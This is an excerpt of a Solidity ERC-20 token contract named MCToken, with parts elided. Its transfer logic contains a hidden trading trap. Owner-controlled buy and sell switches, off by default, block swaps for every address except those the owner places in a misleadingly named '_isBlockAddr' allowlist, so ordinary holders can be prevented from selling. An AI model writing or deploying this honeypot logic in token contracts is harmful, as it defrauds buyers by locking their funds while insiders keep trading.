...
contract MCToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isBlockAddr;
    ...
    bool public SwapBuySwitch = false;
    bool public SwapSellSwitch = false;
    ...
    constructor (
        ...
        _isBlockAddr[address(this)] = true;
        _owner = msg.sender;
    ...
    function setBlockWallet(address payable wallet) external onlyOwner{
        BlockAddress = wallet;
    }

    function setSwapAddress(address payable wallet) external onlyOwner{
        SwapAddress = wallet;
    }

    function setSwapBuySwitch(bool Switch) public onlyOwner {
        SwapBuySwitch = Switch;
    }
    function setSwapSellSwitch(bool Switch) public onlyOwner {
        SwapSellSwitch = Switch;
    }
    ...
    function AddToBlock(address account) public onlyOwner {
        _isBlockAddr[account] = true; 
    } 
    function RemoveFromBlock(address account) public onlyOwner {
        _isBlockAddr[account] = false;
    }
    function isBlockAddr(address account) public view returns(bool) {
        return _isBlockAddr[account];
    }
    ...
    function _transfer(
        ...
        if ( !SwapBuySwitch ){ // can not buy swap 
            if ( SwapAddress == from) {// now it is swaping
                require( _isBlockAddr[to], "can't swap now");
            }
        }
        if ( !SwapSellSwitch ){ // can not buy swap 
            if ( SwapAddress == to) {// now it is swaping
                require( _isBlockAddr[from], "can't swap now");
            }
        }
        Param memory param;
